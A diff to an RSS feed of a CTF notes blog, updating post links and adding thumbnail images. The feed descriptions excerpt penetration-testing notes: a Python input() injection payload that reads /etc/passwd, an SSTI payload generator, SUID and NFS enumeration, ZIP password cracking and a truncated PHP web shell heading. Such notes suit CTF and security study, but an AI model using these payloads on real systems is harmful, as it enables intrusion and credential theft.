@@ -39,25 +39,25 @@
     
     <item>
       <title>Python</title>
-      <link>https://53ctf.github.io/posts/notes/python/python/</link>
+      <link>https://53ctf.github.io/posts/notes/python/</link>
       <pubDate>Sat, 07 Jan 2023 18:04:11 +0530</pubDate>
       
-      <guid>https://53ctf.github.io/posts/notes/python/python/</guid>
+      <guid>https://53ctf.github.io/posts/notes/python/</guid>
       <description>Take Advantage Of input() Function And Run System Commands Within It
 __import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat /etc/passwd&amp;#39;) Easy SSTI Payloads Generator
 GitHub Source
 #!/usr/bin/python3 from cmd import Cmd import urllib.parse, argparse parser = argparse.ArgumentParser(description=&amp;#34;Generate SSTI payloads.</description>
-      
+      <media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://53ctf.github.io/posts/notes/python/featured.png" />
     </item>
     
     <item>
       <title>Linux</title>
-      <link>https://53ctf.github.io/posts/notes/linux/linux-notes/</link>
+      <link>https://53ctf.github.io/posts/notes/linux/</link>
       <pubDate>Sat, 07 Jan 2023 09:33:57 +0530</pubDate>
       
-      <guid>https://53ctf.github.io/posts/notes/linux/linux-notes/</guid>
+      <guid>https://53ctf.github.io/posts/notes/linux/</guid>
       <description>View Cron Jobs&gt; View Cron Jobs # crontab -l List Scheduled Processes/Tasks/Scripts&gt; List Scheduled Processes/Tasks/Scripts # systemctl list-timers View NFS (Network File Share)&gt; View NFS (Network File Share) # showmount REMOTE_IP -e Mount NFS&gt; Mount NFS # mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT Crack ZIP Files&gt; Crack ZIP Files # fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE Find SUID Binaries&gt; Find SUID Binaries # find / -type f -perm -4000 2&amp;gt;/dev/null PHP WebShell&gt; PHP WebShell # &amp;lt;?</description>
-      
+      <media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://53ctf.github.io/posts/notes/linux/featured.png" />
     </item>
     
   </channel>
